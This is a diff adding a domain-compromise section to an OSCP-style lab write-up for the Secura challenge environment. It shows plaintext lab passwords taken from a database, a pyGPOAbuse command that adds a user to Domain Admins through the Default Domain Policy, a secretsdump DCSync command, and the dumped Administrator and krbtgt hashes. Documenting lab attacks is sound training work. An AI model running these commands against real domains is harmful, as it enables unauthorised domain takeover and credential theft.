@@ -2,11 +2,11 @@
 title: Secura — Challenge Lab Writeup
 date: 2026-10-18 20:30:00 +0800
 categories: [OSCP, Challenges]
-tags: [oscp, secura, active-directory, privilege-escalation, mariadb, udf, adscan, secretsdump]
+tags: [oscp, secura, active-directory, privilege-escalation, mariadb, udf, adscan, secretsdump, gpo]
 description: >-
   Full walkthrough of the Secura (Challenge Lab 0) Active Directory environment —
   ManageEngine RCE, RDCMan credential theft, MariaDB UDF privilege escalation,
-  credential dumping, and domain enumeration.
+  credential dumping, GPO abuse, and full domain compromise via DCSync.
 render_with_liquid: false
 ---
 
@@ -333,11 +333,50 @@ Key findings:
 
 ## 9.0 Domain Compromise
 
-> _(pending — Domain Controller)_
+### 9.1 charlotte's Credentials — from the MySQL creds table
+
+We already had MySQL root access on ERA (from the UDF escalation in section 7.0). While digging for more credentials, we found a database called `creds` that does not exist in a standard XAMPP install. It held a single table with two plaintext passwords:
+
+```
+name          pass
+administrator Almost4There8.?
+charlotte     Game2On4.!
+```
+
+The `administrator` entry matched the password we had already recovered from LSA. The `charlotte` entry was new — a domain user's password.
+
+### 9.2 GPO Abuse — charlotte to Domain Admins
+
+We tested charlotte's password against the Domain Controller and got a valid WinRM session. A first DCSync attempt as charlotte failed (she held only partial replication rights), but the expected path was GPO abuse: charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
+
+We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy that adds charlotte to Domain Admins:
+
+```bash
+python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
+```
+
+We then forced the policy to apply with `gpupdate /force` from charlotte's WinRM shell on the DC. The scheduled task ran as SYSTEM on the Domain Controller and added charlotte to the Domain Admins group.
+
+### 9.3 DCSync — Full Domain Compromise
+
+With charlotte now in Domain Admins, a DCSync as charlotte dumped every account hash in the domain:
+
+```bash
+impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
+```
+
+The Domain Administrator and krbtgt hashes were recovered, giving full control of `secura.yzx`:
+
+```
+Administrator : d38e7c66048f80fd9566ab85afca76b1
+krbtgt        : 431f60ffa71152f8445bea272663d7c3
+```
+
+The krbtgt hash is the domain's Kerberos master key — possession of it allows forging golden tickets, giving persistent Domain Admin access.
 
 ---
 
 ## 10.0 Flags
 
-- **local.txt:**
-- **proof.txt:**
+- **local.txt** (ERA — local Administrator): *(pending)*
+- **proof.txt** (DC01 — Domain Administrator): *(pending)*
